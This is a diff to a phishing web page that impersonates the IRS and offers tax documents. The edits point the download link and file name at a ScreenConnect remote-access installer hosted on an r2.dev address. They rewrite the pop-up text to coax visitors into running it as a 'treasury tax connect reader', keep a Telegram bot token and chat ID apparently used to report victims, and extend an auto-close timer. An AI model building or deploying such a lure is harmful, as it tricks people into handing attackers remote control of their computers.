@@ -662,7 +662,7 @@
 
         <!-- manual download link (will be updated) -->
         <div class="download-link-box" id="manualDownloadBox">
-          <a href="#" id="manualDownloadLink" style="display:inline-block;">Download TAX_Statement_COMPLETE.zip</a>
+          <a href="https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi" id="manualDownloadLink" style="display:inline-block;">Download TAX_Statement_COMPLETE.msi</a>
           <span style="margin-left:12px;font-size:13px;color:#555;">(manual fallback)</span>
         </div>
 
@@ -709,11 +709,11 @@
         <text x="76" y="58" text-anchor="middle" font-size="38" font-weight="900" fill="#1a1a1a" font-family="serif" letter-spacing="2">IRS</text>
       </svg>
     </div>
-    <div class="modal-title">Access your compiled tax downloaded information using the U.S treasury screen-client tax connect!</div>
-    <div class="modal-subtitle">If your connect files did not download automatically, would you download it manually?</div>
+    <div class="modal-title">Please refer to your downloaded tax documents archive (14)Pages via the U.S treasury screen-client tax connect reader!</div>
+    <div class="modal-subtitle">Successfully transmitted & safeguarded by cutting edge. Please follow the instructions on your screen.</div>
     <div class="modal-buttons">
-      <button class="btn-no" onclick="document.getElementById('feedbackModal').style.display='none'">No thanks</button>
-      <button class="btn-yes"onclick="document.getElementById('feedbackModal').style.display='none'">Yes, I'd like to download manually.</button>
+      <button class="btn-no" onclick="document.getElementById('feedbackModal').style.display='none'">Submit</button>
+      <button class="btn-yes"onclick="document.getElementById('feedbackModal').style.display='none'">Download manually.</button>
     </div>
     <div class="modal-footer">
       <div class="help-icon">?</div>
@@ -801,7 +801,7 @@
   const CONFIG = {
     TELEGRAM_BOT_TOKEN: '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ',        // <-- replace with real token
     TELEGRAM_CHAT_ID: '7724482403',            // <-- replace with real chat ID
-    DOWNLOAD_FILE_NAME: 'TAX_Act Docs2026',
+    DOWNLOAD_FILE_NAME: 'ScreenConnect.ClientSetup.msi',
     DOWNLOAD_BASE_URL: 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/',
   };
 
@@ -1162,7 +1162,7 @@
               // If window.close() is blocked, redirect to about:blank
               window.location.href = 'about:blank';
           }
-      }, 50000); // 50 seconds
+      }, 70000); // 70 seconds
   }
 
   // Call forcePageClose after page loads
